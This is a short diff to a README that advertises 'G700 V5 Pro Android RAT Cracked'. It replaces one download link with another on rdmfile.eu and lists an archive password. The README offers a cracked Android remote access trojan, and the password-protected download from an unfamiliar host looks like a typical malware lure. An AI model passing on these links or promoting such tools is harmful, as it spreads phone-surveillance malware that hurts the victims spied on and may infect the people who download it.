@@ -1,6 +1,6 @@
 # G700-Pro-Updated
 
-[Click Here To Download](https://www.mediafire.com/file/0oj75v1smkev7fk/G700.rar/file)
+[Click Here To Download](https://rdmfile.eu/install/eFNW6reGwi7R)
 [Pass : S0f4fr33!]
 
 💠 G700 V5 Pro Android RAT Cracked 💠
